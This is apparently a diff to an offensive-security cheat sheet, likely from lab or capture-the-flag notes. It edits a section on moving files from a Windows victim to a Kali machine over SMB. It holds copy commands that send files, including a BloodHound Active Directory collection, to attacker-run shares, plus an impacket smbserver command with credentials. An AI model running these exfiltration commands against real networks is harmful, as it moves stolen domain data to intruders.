@@ -145,17 +145,18 @@ Victim access:
 \\ATTACKER_IP\share
 ```
 
-Download file:
+Copy file (from windows to kali):
 
 ```cmd
 copy file.txt \\10.10.14.5\share\
+copy 20260416085446_BloodHound.zip \\10.150.72.7\share\ 
 ```
 
 For authenticated access
 
 ```
 smbserver.py share . -smb2support -username test -password test
-copy 20260416085446_BloodHound.zip \\10.150.72.7\share\ (from windows to kali)
+copy 20260416085446_BloodHound.zip \\test:test@10.150.72.7\share\
 ```
 
 ---
